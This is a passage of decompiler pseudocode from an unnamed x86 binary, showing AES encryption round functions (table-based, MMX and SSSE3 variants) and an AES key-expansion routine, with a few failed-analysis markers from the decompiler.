  return v22[4] ^ *(_DWORD *)(a5 + 8 * HIBYTE(v9) + 2) & 0xFF000000 ^ *(_DWORD *)(a5 + 8 * BYTE2(v8)) & 0xFF0000 ^ *(_DWORD *)(a5 + 8 * BYTE1(v7)) & 0xFF00 ^ (unsigned __int8)*(_DWORD *)(a5 + 8 * (unsigned __int8)v6 + 2);
}

//----- (0040F780) --------------------------------------------------------
int __cdecl sub_40F780(__m64 *a1, __m64 *a2, __m64 *a3)
{
  void *v3; // esp
  int v4; // ebx
  int v5; // ebp
  __m64 m64_u64; // mm0
  __m64 v7; // mm4
  int result; // eax
  int v9; // ebx
  __int32 v10; // ecx
  __int32 v11; // edx
  _DWORD v12[7]; // [esp+0h] [ebp-34h] BYREF
  int v13; // [esp+1Ch] [ebp-18h]
  int *v14; // [esp+20h] [ebp-14h]
  int v15; // [esp+24h] [ebp-10h] BYREF

  v3 = alloca(((char *)v12 - ((char *)&a3[-16].m64_u64 + 1)) & 0x3C0);
  v14 = &v15;
  v12[0] = 4257711;
  v4 = ((_WORD)v3 + 6076) & 0x300;
  v5 = v4 + 4256704;
  if ( _bittest(&dword_73C6D0, 0x19u) )
  {
    m64_u64 = (__m64)a1->m64_u64;
    v7 = a1[1];
    result = sub_40E6E0(v5, a3, (__m64)a1->m64_u64, v7);
    a2->m64_u64 = (unsigned __int64)m64_u64;
    a2[1].m64_u64 = (unsigned __int64)v7;
    _m_empty();
  }
  else
  {
    v13 = v12[0] - 3183 + v4 + 2176;
    v9 = a1->m64_i32[1];
    result = sub_40E380(
               a1->m64_i32[0],
               a1[1].m64_i32[1],
               a1[1].m64_i32[0],
               v9,
               v5,
               a3,
               v12[1],
               v12[2],
               v12[3],
               v12[4],
               v12[5],
               v12[6],
               v13);
    a2->m64_i32[0] = result;
    a2->m64_i32[1] = v9;
    a2[1].m64_i32[0] = v10;
    a2[1].m64_i32[1] = v11;
  }
  return result;
}
// 40F821: variable 'v10' is possibly undefined
// 40F824: variable 'v11' is possibly undefined
// 73C6D0: using guessed type int dword_73C6D0;
// 40F780: using guessed type _DWORD anonymous_0[7];

//----- (0040F830) --------------------------------------------------------
int __usercall sub_40F830@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        _DWORD *a6@<edi>,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13)
{
  unsigned int v13; // eax
  unsigned int v14; // ebx
  unsigned int v15; // ecx
  unsigned int v16; // edx
  int v17; // esi
  int v18; // edx
  int v19; // ecx
  int v20; // edx
  unsigned int v21; // eax
  unsigned int v22; // ebx
  unsigned int v23; // esi
  unsigned int v24; // ebx
  unsigned int v25; // ecx
  unsigned int v26; // esi
  unsigned int v27; // ecx
  unsigned int v28; // edx
  unsigned int v29; // esi
  unsigned int v30; // eax
  unsigned int v31; // ecx
  unsigned int v32; // edx
  unsigned int v33; // esi
  int v35; // [esp+4h] [ebp+4h]
  int v36; // [esp+8h] [ebp+8h]
  unsigned int v37; // [esp+Ch] [ebp+Ch]
  unsigned int v38; // [esp+10h] [ebp+10h]
  _DWORD *v39; // [esp+14h] [ebp+14h]

  v39 = a6;
  v13 = *a6 ^ a1;
  v14 = a6[1] ^ a4;
  v15 = a6[2] ^ a3;
  v16 = a6[3] ^ a2;
  do
  {
    v35 = (*(unsigned __int8 *)(a5 + HIBYTE(v14) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v15) - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v16) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v13 - 128);
    v36 = (*(unsigned __int8 *)(a5 + HIBYTE(v15) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v16) - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v13) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v14 - 128);
    v17 = (*(unsigned __int8 *)(a5 + HIBYTE(v16) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v13) - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v14) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v15 - 128);
    v18 = (*(unsigned __int8 *)(a5 + BYTE1(v15) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v16 - 128);
    v19 = v17;
    v20 = (*(unsigned __int8 *)(a5 + HIBYTE(v13) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v14) - 128) << 16) ^ v18;
    v21 = ((v17 & 0x80808080) - ((v17 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v17) & 0xFEFEFEFE;
    v22 = ((v21 & 0x80808080) - ((v21 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v21) & 0xFEFEFEFE;
    v23 = ((v22 & 0x80808080) - ((v22 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    v37 = __ROL4__(v23 ^ (2 * v22) & 0xFEFEFEFE, 8) ^ __ROL4__(v23 ^ (2 * v22) & 0xFEFEFEFE ^ v19 ^ v22, 16) ^ __ROL4__(v23 ^ (2 * v22) & 0xFEFEFEFE ^ v19 ^ v21, 24) ^ v23 ^ (2 * v22) & 0xFEFEFEFE ^ v19 ^ v22 ^ v19 ^ v21 ^ __ROL4__(v19, 8);
    v24 = ((v20 & 0x80808080) - ((v20 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v20) & 0xFEFEFEFE;
    v25 = ((v24 & 0x80808080) - ((v24 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v24) & 0xFEFEFEFE;
    v26 = ((v25 & 0x80808080) - ((v25 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    v38 = __ROL4__(v26 ^ (2 * v25) & 0xFEFEFEFE, 8) ^ __ROL4__(v26 ^ (2 * v25) & 0xFEFEFEFE ^ v20 ^ v25, 16) ^ __ROL4__(v26 ^ (2 * v25) & 0xFEFEFEFE ^ v20 ^ v24, 24) ^ v26 ^ (2 * v25) & 0xFEFEFEFE ^ v20 ^ v25 ^ v20 ^ v24 ^ __ROL4__(v20, 8);
    v27 = ((v35 & 0x80808080) - ((v35 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v35) & 0xFEFEFEFE;
    v28 = ((v27 & 0x80808080) - ((v27 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v27) & 0xFEFEFEFE;
    v29 = ((v28 & 0x80808080) - ((v28 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    v30 = __ROL4__(v29 ^ (2 * v28) & 0xFEFEFEFE, 8) ^ __ROL4__(v29 ^ (2 * v28) & 0xFEFEFEFE ^ v35 ^ v28, 16) ^ __ROL4__(v29 ^ (2 * v28) & 0xFEFEFEFE ^ v35 ^ v27, 24) ^ v29 ^ (2 * v28) & 0xFEFEFEFE ^ v35 ^ v28 ^ v35 ^ v27 ^ __ROL4__(v35, 8);
    v31 = ((v36 & 0x80808080) - ((v36 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v36) & 0xFEFEFEFE;
    v32 = ((v31 & 0x80808080) - ((v31 & 0x80808080) >> 7)) & 0x1B1B1B1B ^ (2 * v31) & 0xFEFEFEFE;
    v33 = ((v32 & 0x80808080) - ((v32 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    a5 = a13;
    v13 = v39[4] ^ v30;
    v14 = v39[5] ^ __ROL4__(v33 ^ (2 * v32) & 0xFEFEFEFE, 8) ^ __ROL4__(v33 ^ (2 * v32) & 0xFEFEFEFE ^ v36 ^ v32, 16) ^ __ROL4__(v33 ^ (2 * v32) & 0xFEFEFEFE ^ v36 ^ v31, 24) ^ v33 ^ (2 * v32) & 0xFEFEFEFE ^ v36 ^ v32 ^ v36 ^ v31 ^ __ROL4__(v36, 8);
    v15 = v39[6] ^ v37;
    v16 = v39[7] ^ v38;
    v39 += 4;
  }
  while ( v39 < &a6[4 * a6[60] - 4] );
  return v39[4] ^ (*(unsigned __int8 *)(a13 + HIBYTE(v14) - 128) << 24) ^ (*(unsigned __int8 *)(a13 + BYTE2(v15) - 128) << 16) ^ (*(unsigned __int8 *)(a13 + BYTE1(v16) - 128) << 8) ^ *(unsigned __int8 *)(a13 + (unsigned __int8)v13 - 128);
}

//----- (0040FCB0) --------------------------------------------------------
int __usercall sub_40FCB0@<eax>(int a1@<ebp>, __m64 *a2@<edi>, __m64 a3@<mm0>, __m64 a4@<mm4>)
{
  __m64 v4; // mm0
  __m64 v5; // mm4
  unsigned int v6; // eax
  unsigned int v7; // ebx
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // esi
  int v12; // edx
  int v13; // ecx
  int v14; // edi
  unsigned int v15; // eax
  int v16; // ecx
  int v17; // esi
  int v18; // edi
  unsigned int v19; // ebx
  __m64 v20; // mm0
  int v21; // ecx
  int v22; // edx
  int v23; // edi
  int v24; // edx
  int v25; // esi
  int v26; // edi
  __m64 v27; // mm0
  int v28; // edx
  int result; // eax
  __m64 v30; // mm4
  __m64 v31; // mm2
  __m64 v32; // mm6
  __m64 v33; // mm3
  __m64 v34; // mm7
  __m64 v35; // mm1
  __m64 v36; // mm5
  __m64 v37; // mm0
  __m64 v38; // mm4
  __m64 v39; // mm1
  __m64 v40; // mm5
  __m64 v41; // mm3
  __m64 v42; // mm7
  __m64 v43; // mm0
  __m64 v44; // mm4
  __m64 v45; // mm1
  __m64 v46; // mm5
  __m64 v47; // mm3
  __m64 v48; // mm7
  __m64 *v53; // [esp+14h] [ebp+14h]
  unsigned int v55; // [esp+18h] [ebp+18h]

  v4 = _m_pxor(a3, (__m64)a2->m64_u64);
  v5 = _m_pxor(a4, a2[1]);
  v55 = (unsigned int)&a2[2 * a2[30].m64_i32[0] - 2];
  while ( 1 )
  {
    v6 = _mm_cvtsi64_si32(_m_pshufw(v4, 12));
    v7 = _mm_cvtsi64_si32(_m_pshufw(v5, 9));
    v53 = a2;
    v8 = *(unsigned __int8 *)(a1 + (unsigned __int8)v6 - 128);
    v9 = *(unsigned __int8 *)(a1 + BYTE1(v6) - 128);
    v6 >>= 16;
    v10 = (*(unsigned __int8 *)(a1 + (unsigned __int8)v7 - 128) << 16) | v8;
    v11 = *(unsigned __int8 *)(a1 + BYTE1(v7) - 128) << 24;
    v7 >>= 16;
    v12 = v11 | (v9 << 8);
    v13 = (*(unsigned __int8 *)(a1 + BYTE1(v6) - 128) << 24) | v10;
    v14 = (unsigned __int8)v6;
    v15 = _mm_cvtsi64_si32(_m_pshufw(v4, 6));
    v16 = (*(unsigned __int8 *)(a1 + BYTE1(v7) - 128) << 8) | v13;
    v17 = *(unsigned __int8 *)(a1 + v14 - 128);
    v18 = (unsigned __int8)v7;
    v19 = _mm_cvtsi64_si32(_m_pshufw(v5, 3));
    v20 = _mm_cvtsi32_si64(v16);
    v21 = (v17 << 16) | *(unsigned __int8 *)(a1 + v18 - 128);
    v22 = *(unsigned __int8 *)(a1 + (unsigned __int8)v15 - 128) | v12;
    v23 = BYTE1(v15);
    v15 >>= 16;
    v24 = (*(unsigned __int8 *)(a1 + (unsigned __int8)v19 - 128) << 16) | v22;
    v25 = *(unsigned __int8 *)(a1 + v23 - 128);
    v26 = BYTE1(v19);
    v19 >>= 16;
    v27 = _m_punpckldq(v20, _mm_cvtsi32_si64(v24));
    v28 = (*(unsigned __int8 *)(a1 + (unsigned __int8)v15 - 128) << 16) | *(unsigned __int8 *)(a1
                                                                                             + (unsigned __int8)v19
                                                                                             - 128) | (v25 << 8) | (*(unsigned __int8 *)(a1 + v26 - 128) << 24);
    result = *(unsigned __int8 *)(a1 + BYTE1(v15) - 128) << 24;
    v30 = _m_punpckldq(
            _mm_cvtsi32_si64(v28),
            _mm_cvtsi32_si64(result | (*(unsigned __int8 *)(a1 + BYTE1(v19) - 128) << 8) | (unsigned int)v21));
    a2 = v53 + 2;
    if ( (unsigned int)&v53[2] > v55 )
      break;
    v31 = _m_pslldi(_m_pshufw(v27, 228), 8u);
    v32 = _m_pslldi(_m_pshufw(v30, 228), 8u);
    v33 = _m_psrldi(v27, 8u);
    v34 = _m_psrldi(v30, 8u);
    v35 = _m_pxor(_m_paddb(v27, v27), _m_pand(_m_pcmpgtb(0i64, v27), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v36 = _m_pxor(_m_paddb(v30, v30), _m_pand(_m_pcmpgtb(0i64, v30), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v37 = _m_pxor(
            _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(_m_pxor(_m_pxor(_m_pshufw(v27, 177), v31), v33), _m_pslldi(v31, 0x10u)),
                  _m_psrldi(v33, 0x10u)),
                v35),
              _m_pslldi(v35, 0x18u)),
            _m_psrldi(v35, 8u));
    v38 = _m_pxor(
            _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(_m_pxor(_m_pxor(_m_pshufw(v30, 177), v32), v34), _m_pslldi(v32, 0x10u)),
                  _m_psrldi(v34, 0x10u)),
                v36),
              _m_pslldi(v36, 0x18u)),
            _m_psrldi(v36, 8u));
    v39 = _m_pxor(_m_paddb(v35, v35), _m_pand(_m_pcmpgtb(0i64, v35), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v40 = _m_pxor(_m_paddb(v36, v36), _m_pand(_m_pcmpgtb(0i64, v36), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v41 = _m_pxor(_m_paddb(v39, v39), _m_pand(_m_pcmpgtb(0i64, v39), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v42 = _m_pxor(_m_paddb(v40, v40), _m_pand(_m_pcmpgtb(0i64, v40), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v43 = _m_pxor(_m_pxor(_m_pxor(_m_pxor(v37, v39), _m_pshufw(v39, 177)), v41), _m_pshufw(v41, 177));
    v44 = _m_pxor(_m_pxor(_m_pxor(_m_pxor(v38, v40), _m_pshufw(v40, 177)), v42), _m_pshufw(v42, 177));
    v45 = _m_pslldi(v41, 8u);
    v46 = _m_pslldi(v42, 8u);
    v47 = _m_psrldi(v41, 8u);
    v48 = _m_psrldi(v42, 8u);
    v4 = _m_pxor(
           _m_pxor(_m_pxor(_m_pxor(_m_pxor(v43, v45), v47), _m_pslldi(v45, 0x10u)), _m_psrldi(v47, 0x10u)),
           (__m64)a2->m64_u64);
    v5 = _m_pxor(
           _m_pxor(_m_pxor(_m_pxor(_m_pxor(v44, v46), v48), _m_pslldi(v46, 0x10u)), _m_psrldi(v48, 0x10u)),
           v53[3]);
  }
  return result;
}

//----- (0040FF80) --------------------------------------------------------
int __usercall sub_40FF80@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // ecx
  unsigned int v9; // edx
  int v10; // esi
  int v11; // edx
  int v14; // [esp+4h] [ebp+4h]
  int v16; // [esp+8h] [ebp+8h]
  _DWORD *v20; // [esp+14h] [ebp+14h]

  v20 = a6;
  v6 = *a6 ^ a1;
  v7 = a6[1] ^ a4;
  v8 = a6[2] ^ a3;
  v9 = a6[3] ^ a2;
  do
  {
    v14 = *(_DWORD *)(a5 + 8 * HIBYTE(v7) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v8) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v9) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v6);
    v16 = *(_DWORD *)(a5 + 8 * HIBYTE(v8) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v9) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v6) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v7);
    v10 = *(_DWORD *)(a5 + 8 * HIBYTE(v9) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v6) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v7) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v8);
    v11 = *(_DWORD *)(a5 + 8 * HIBYTE(v6) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v7) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v8) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v9);
    v6 = v20[4] ^ v14;
    v7 = v20[5] ^ v16;
    v8 = v20[6] ^ v10;
    v9 = v20[7] ^ v11;
    v20 += 4;
  }
  while ( v20 < &a6[4 * a6[60] - 4] );
  return v20[4] ^ (*(unsigned __int8 *)(a5 + 2048 + HIBYTE(v7)) << 24) ^ (*(unsigned __int8 *)(a5 + 2048 + BYTE2(v8)) << 16) ^ (*(unsigned __int8 *)(a5 + 2048 + BYTE1(v9)) << 8) ^ *(unsigned __int8 *)(a5 + 2048 + (unsigned __int8)v6);
}

//----- (00410DC0) --------------------------------------------------------
int __cdecl sub_410DC0(__m64 *a1, __m64 *a2, __m64 *a3)
{
  void *v3; // esp
  int v4; // ebx
  int v5; // ebp
  __m64 m64_u64; // mm0
  __m64 v7; // mm4
  int result; // eax
  int v9; // ebx
  __int32 v10; // ecx
  __int32 v11; // edx
  _DWORD v12[7]; // [esp+0h] [ebp-34h] BYREF
  int v13; // [esp+1Ch] [ebp-18h]
  int *v14; // [esp+20h] [ebp-14h]
  int v15; // [esp+24h] [ebp-10h] BYREF

  v3 = alloca(((char *)v12 - ((char *)&a3[-16].m64_u64 + 1)) & 0x3C0);
  v14 = &v15;
  v12[0] = 4263407;
  v4 = ((_WORD)v3 - 448 + 764) & 0x300;
  v5 = v4 + 4262464;
  if ( _bittest(&dword_73C6D0, 0x19u) )
  {
    m64_u64 = (__m64)a1->m64_u64;
    v7 = a1[1];
    result = sub_40FCB0(v5, a3, (__m64)a1->m64_u64, v7);
    a2->m64_u64 = (unsigned __int64)m64_u64;
    a2[1].m64_u64 = (unsigned __int64)v7;
    _m_empty();
  }
  else
  {
    v13 = v12[0] - 3119 + v4 + 2176;
    v9 = a1->m64_i32[1];
    result = sub_40F830(
               a1->m64_i32[0],
               a1[1].m64_i32[1],
               a1[1].m64_i32[0],
               v9,
               v5,
               a3,
               v12[1],
               v12[2],
               v12[3],
               v12[4],
               v12[5],
               v12[6],
               v13);
    a2->m64_i32[0] = result;
    a2->m64_i32[1] = v9;
    a2[1].m64_i32[0] = v10;
    a2[1].m64_i32[1] = v11;
  }
  return result;
}
// 410E61: variable 'v10' is possibly undefined
// 410E64: variable 'v11' is possibly undefined
// 73C6D0: using guessed type int dword_73C6D0;
// 410DC0: using guessed type _DWORD anonymous_0[7];

//----- (00410E70) --------------------------------------------------------
#error "41143E: call analysis failed (funcsize=519)"

//----- (00411500) --------------------------------------------------------
int __cdecl sub_411500(int a1, int *a2, int a3, int *a4)
{
  int *v4; // edi
  int v6; // eax
  int v7; // ebx
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // ebx
  int v16; // ecx
  int v17; // edx
  int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // ebx
  int v26; // ecx
  int v27; // edx
  int v28; // ebx
  int v29; // ecx
  int v30; // edx
  int v31; // ecx
  int v32; // eax
  int v33; // eax
  int v34; // eax
  int v35; // eax
  int v36; // eax
  int v37; // eax
  int v38; // eax

  v4 = a4;
  if ( !a2 || !a4 )
    return -1;
  switch ( a3 )
  {
    case 128:
      v6 = *a2;
      v7 = a2[1];
      v8 = a2[2];
      v9 = a2[3];
      *a4 = *a2;
      a4[1] = v7;
      a4[2] = v8;
      a4[3] = v9;
      v10 = 0;
      while ( 1 )
      {
        v11 = dword_40EDD8[v10 + 602] ^ (*((unsigned __int8 *)&dword_40EDD8[346] + HIBYTE(v9)) << 16) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + BYTE2(v9)) << 8) ^ *((unsigned __int8 *)&dword_40EDD8[346] + BYTE1(v9)) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + (unsigned __int8)v9) << 24) ^ v6;
        v4[4] = v11;
        v12 = v4[1] ^ v11;
        v4[5] = v12;
        v13 = v4[2] ^ v12;
        v4[6] = v13;
        v4[7] = v4[3] ^ v13;
        ++v10;
        v4 += 4;
        if ( v10 >= 10 )
          break;
        v6 = *v4;
        v9 = v4[3];
      }
      v4[20] = 10;
      return 0;
    case 192:
      v14 = *a2;
      v15 = a2[1];
      v16 = a2[2];
      v17 = a2[3];
      *a4 = *a2;
      a4[1] = v15;
      a4[2] = v16;
      a4[3] = v17;
      v18 = a2[5];
      a4[4] = a2[4];
      a4[5] = v18;
      v19 = 0;
      while ( 1 )
      {
        v20 = dword_40EDD8[v19 + 602] ^ (*((unsigned __int8 *)&dword_40EDD8[346] + HIBYTE(v18)) << 16) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + BYTE2(v18)) << 8) ^ *((unsigned __int8 *)&dword_40EDD8[346] + BYTE1(v18)) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + (unsigned __int8)v18) << 24) ^ v14;
        v4[6] = v20;
        v21 = v4[1] ^ v20;
        v4[7] = v21;
        v22 = v4[2] ^ v21;
        v4[8] = v22;
        v23 = v4[3] ^ v22;
        v4[9] = v23;
        if ( v19 == 7 )
          break;
        ++v19;
        v24 = v4[4] ^ v23;
        v4[10] = v24;
        v4[11] = v4[5] ^ v24;
        v4 += 6;
        v14 = *v4;
        v18 = v4[5];
      }
      v4[18] = 12;
      return 0;
    case 256:
      v25 = a2[1];
      v26 = a2[2];
      v27 = a2[3];
      *a4 = *a2;
      a4[1] = v25;
      a4[2] = v26;
      a4[3] = v27;
      v28 = a2[5];
      v29 = a2[6];
      v30 = a2[7];
      a4[4] = a2[4];
      a4[5] = v28;
      a4[6] = v29;
      a4[7] = v30;
      v31 = 0;
      while ( 1 )
      {
        v32 = dword_40EDD8[v31 + 602] ^ (*((unsigned __int8 *)&dword_40EDD8[346] + HIBYTE(v30)) << 16) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + BYTE2(v30)) << 8) ^ *((unsigned __int8 *)&dword_40EDD8[346] + BYTE1(v30)) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + (unsigned __int8)v30) << 24) ^ *v4;
        v4[8] = v32;
        v33 = v4[1] ^ v32;
        v4[9] = v33;
        v34 = v4[2] ^ v33;
        v4[10] = v34;
        v35 = v4[3] ^ v34;
        v4[11] = v35;
        if ( v31 == 6 )
          break;
        ++v31;
        v36 = (*((unsigned __int8 *)&dword_40EDD8[346] + HIBYTE(v35)) << 24) ^ (*((unsigned __int8 *)&dword_40EDD8[346]
                                                                                + BYTE2(v35)) << 16) ^ (*((unsigned __int8 *)&dword_40EDD8[346] + BYTE1(v35)) << 8) ^ *((unsigned __int8 *)&dword_40EDD8[346] + (unsigned __int8)v35) ^ v4[4];
        v4[12] = v36;
        v37 = v4[5] ^ v36;
        v4[13] = v37;
        v38 = v4[6] ^ v37;
        v4[14] = v38;
        v4[15] = v4[7] ^ v38;
        v4 += 8;
        v30 = v4[7];
      }
      v4[12] = 14;
      return 0;
    default:
      return -2;
  }
}
// 40EDD8: using guessed type int[618];

//----- (004117D0) --------------------------------------------------------
#error "4117D0: call analysis failed (funcsize=2)"

//----- (004117E0) --------------------------------------------------------
#error "4117E0: call analysis failed (funcsize=226)"

//----- (00411E40) --------------------------------------------------------
void sub_411E40()
{
  ;
}

//----- (00411E50) --------------------------------------------------------
__m128i __usercall sub_411E50@<xmm0>(
        const __m128i *a1@<edx>,
        const __m128i *a2@<ebp>,
        __m128i a3@<xmm0>,
        __m128i a4@<xmm6>,
        __m128i a5@<xmm7>)
{
  int v5; // ecx
  __int32 v6; // eax
  __m128i v7; // xmm2
  bool v8; // zf
  const __m128i *v9; // edx
  const __m128i *v10; // ebx
  __m128i i; // xmm0
  __m128i v12; // xmm0
  __m128i si128; // xmm1
  __m128i v14; // xmm5
  __m128i v15; // xmm2
  __m128i v16; // xmm3
  __m128i v17; // xmm0
  __m128i v18; // xmm3
  __m128i v19; // xmm1
  __m128i v20; // xmm0
  __m128i v21; // xmm5
  __m128i v22; // xmm0
  __m128i v23; // xmm2
  __m128i v24; // xmm3
  __m128i v25; // xmm5
  __m128i v26; // xmm3

  v5 = 16;
  v6 = a1[15].m128i_i32[0];
  v7 = _mm_xor_si128(_mm_shuffle_epi8(_mm_load_si128(a2), _mm_and_si128(a3, a4)), _mm_loadu_si128(a1));
  v8 = &a1[1] == 0;
  v9 = a1 + 1;
  v10 = a2 + 12;
  for ( i = _mm_xor_si128(_mm_shuffle_epi8(_mm_load_si128(a2 + 1), _mm_srli_epi32(_mm_andnot_si128(a4, a3), 4u)), v7);
        ;
        i = _mm_xor_si128(_mm_shuffle_epi8(v17, si128), v18) )
  {
    v19 = _mm_srli_epi32(_mm_andnot_si128(a4, i), 4u);
    v20 = _mm_and_si128(i, a4);
    v21 = _mm_shuffle_epi8(_mm_load_si128(a2 - 2), v20);
    v22 = _mm_xor_si128(v20, v19);
    v23 = _mm_xor_si128(_mm_shuffle_epi8(a5, _mm_xor_si128(_mm_shuffle_epi8(a5, v19), v21)), v22);
    v24 = _mm_shuffle_epi8(a5, _mm_xor_si128(_mm_shuffle_epi8(a5, v22), v21));
    v25 = _mm_loadu_si128(v9);
    v26 = _mm_xor_si128(v24, v19);
    if ( v8 )
      break;
    v12 = _mm_xor_si128(
            _mm_shuffle_epi8(_mm_load_si128(a2 + 3), v26),
            _mm_xor_si128(_mm_shuffle_epi8(_mm_load_si128(a2 + 2), v23), v25));
    si128 = _mm_load_si128((const __m128i *)((char *)v10 + v5 - 64));
    v14 = _mm_shuffle_epi8(_mm_load_si128(a2 + 4), v23);
    v15 = _mm_shuffle_epi8(_mm_load_si128(a2 + 5), v26);
    v16 = v12;
    ++v9;
    v17 = _mm_xor_si128(_mm_shuffle_epi8(v12, si128), _mm_xor_si128(v15, v14));
    v18 = _mm_xor_si128(_mm_shuffle_epi8(v16, _mm_load_si128((const __m128i *)((char *)v10 + v5))), v17);
    v5 = ((_BYTE)v5 + 16) & 0x30;
    v8 = --v6 == 0;
  }
  return _mm_shuffle_epi8(
           _mm_xor_si128(
             _mm_shuffle_epi8(_mm_load_si128(a2 + 7), v26),
             _mm_xor_si128(_mm_shuffle_epi8(_mm_load_si128(a2 + 6), v23), v25)),
           _mm_load_si128((const __m128i *)((char *)v10 + v5 + 64)));
}

//----- (00411F90) --------------------------------------------------------
__m128i __usercall sub_411F90@<xmm0>(
        const __m128i *a1@<edx>,
        const __m128i *a2@<ebp>,
        __m128i a3@<xmm0>,
        __m128i a4@<xmm6>,
        __m128i a5@<xmm7>)
{
  __int32 v5; // eax
  __m128i si128; // xmm5
  __m128i v7; // xmm0
  bool v8; // zf
  const __m128i *v9; // edx
  const __m128i *v10; // ecx
  __m128i v11; // xmm0
  __m128i v12; // xmm1
  __m128i v13; // xmm0
  __m128i v14; // xmm1
  __m128i v15; // xmm2
  __m128i v16; // xmm0
  __m128i v17; // xmm4
  __m128i v18; // xmm2
  __m128i v19; // xmm0
  __m128i v20; // xmm3

  v5 = a1[15].m128i_i32[0];
  si128 = _mm_load_si128(a2 + 11);
  v7 = _mm_xor_si128(
         _mm_shuffle_epi8(_mm_load_si128(a2 + 35), _mm_srli_epi32(_mm_andnot_si128(a4, a3), 4u)),
         _mm_xor_si128(_mm_shuffle_epi8(_mm_load_si128(a2 + 34), _mm_and_si128(a3, a4)), _mm_loadu_si128(a1)));
  v8 = &a1[1] == 0;
  v9 = a1 + 1;
  v10 = (const __m128i *)((char *)a2 + (((unsigned __int8)(16 * v5) ^ 0x30) & 0x30) + 256);
  while ( 1 )
  {
    v12 = _mm_andnot_si128(a4, v7);
    v13 = _mm_and_si128(v7, a4);
    v14 = _mm_srli_epi32(v12, 4u);
    v15 = _mm_shuffle_epi8(_mm_load_si128(a2 - 2), v13);
    v16 = _mm_xor_si128(v13, v14);
    v17 = _mm_xor_si128(_mm_shuffle_epi8(a5, v16), v15);
    v18 = _mm_xor_si128(_mm_shuffle_epi8(a5, _mm_xor_si128(_mm_shuffle_epi8(a5, v14), v15)), v16);
    v19 = _mm_loadu_si128(v9);
    v20 = _mm_xor_si128(_mm_shuffle_epi8(a5, v17), v14);
    if ( v8 )
      break;
    v11 = _mm_xor_si128(
            _mm_shuffle_epi8(
              _mm_xor_si128(
                _mm_xor_si128(
                  _mm_shuffle_epi8(
                    _mm_xor_si128(
                      _mm_xor_si128(
                        _mm_shuffle_epi8(
                          _mm_xor_si128(
                            _mm_xor_si128(v19, _mm_shuffle_epi8(_mm_load_si128(a2 + 36), v18)),
                            _mm_shuffle_epi8(_mm_load_si128(a2 + 37), v20)),
                          si128),
                        _mm_shuffle_epi8(_mm_load_si128(a2 + 38), v18)),
                      _mm_shuffle_epi8(_mm_load_si128(a2 + 39), v20)),
                    si128),
                  _mm_shuffle_epi8(_mm_load_si128(a2 + 40), v18)),
                _mm_shuffle_epi8(_mm_load_si128(a2 + 41), v20)),
              si128),
            _mm_shuffle_epi8(_mm_load_si128(a2 + 42), v18));
    ++v9;
    si128 = _mm_alignr_epi8(si128, si128, 12);
    v7 = _mm_xor_si128(v11, _mm_shuffle_epi8(_mm_load_si128(a2 + 43), v20));
    v8 = --v5 == 0;
  }
  return _mm_shuffle_epi8(
           _mm_xor_si128(
             _mm_shuffle_epi8(_mm_load_si128(a2 + 45), v20),
             _mm_xor_si128(_mm_shuffle_epi8(_mm_load_si128(a2 + 44), v18), v19)),
